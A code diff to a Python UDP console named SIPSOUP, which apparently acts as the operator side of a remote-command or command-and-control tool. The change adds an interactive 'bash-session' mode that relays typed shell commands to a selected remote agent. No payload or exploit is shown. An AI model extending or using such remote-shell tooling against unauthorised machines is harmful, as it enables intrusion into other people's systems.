@@ -20,8 +20,8 @@ RED = "\033[38;5;203m"
 GOLD = "\033[38;5;220m"
 
 
-def prompt(agent=None, safe=False):
-    name = f"{agent}" if agent else "SIPSOUP"
+def prompt(agent=None, safe=False, bash=False):
+    name = f"{agent}:bash" if bash else f"{agent}" if agent else "SIPSOUP"
     color = CYAN if agent else PURPLE
     if safe:
         color, end = f"\001{color}{BOLD}\002", f"\001{RESET}\002"
@@ -103,7 +103,7 @@ def receive(sock, secret, agents, seen, state):
             return
         line = readline.get_line_buffer()
         stamp = time.strftime("%H:%M:%S")
-        print(f"\r\033[2K{DIM}{stamp}{RESET}  {message}\n{prompt(state['agent'])}{line}", end="", flush=True)
+        print(f"\r\033[2K{DIM}{stamp}{RESET}  {message}\n{prompt(state['agent'], bash=state['bash'])}{line}", end="", flush=True)
 
 
 def main():
@@ -117,25 +117,31 @@ def main():
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((args.bind, args.port))
-    agents, seen, state = {}, set(), {"agent": None}
+    agents, seen, state = {}, set(), {"agent": None, "bash": False}
     setup_readline(agents, state)
     banner(args.bind, args.port)
     threading.Thread(target=receive, args=(sock, secret, agents, seen, state), daemon=True).start()
     while True:
         try:
-            line = input(prompt(state["agent"], safe=True))
+            line = input(prompt(state["agent"], safe=True, bash=state["bash"]))
             parts = shlex.split(line)
         except (EOFError, KeyboardInterrupt):
             print("\nAu revoir.")
             return
-        if state["agent"] and parts in (["back"], ["exit"]):
+        if state["bash"] and parts == ["exit"]:
+            sock.sendto(build("MESSAGE", state["agent"], "sipsoup", "bash-session exit", secret), agents[state["agent"]])
+            state["bash"] = False
+        elif state["bash"] and line:
+            sock.sendto(build("MESSAGE", state["agent"], "sipsoup", f"bash-session {line}", secret), agents[state["agent"]])
+        elif state["agent"] and parts in (["back"], ["exit"]):
             state["agent"] = None
             print(f"{DIM}Session fermée.{RESET}")
         elif state["agent"] and parts == ["help"]:
             show_help(agent=True)
-        elif state["agent"] and ((len(parts) == 1 and parts[0] in AGENT_COMMANDS) or (len(parts) > 1 and parts[0] == "bash")):
+        elif state["agent"] and (parts == ["bash"] or (len(parts) == 1 and parts[0] in AGENT_COMMANDS) or (len(parts) > 1 and parts[0] == "bash")):
             agent = state["agent"]
             sock.sendto(build("MESSAGE", agent, "sipsoup", line, secret), agents[agent])
+            state["bash"] = parts == ["bash"]
         elif state["agent"] and parts:
             print("Commande refusée. Tapez 'help' ou 'back'.")
         elif parts == ["list"]:
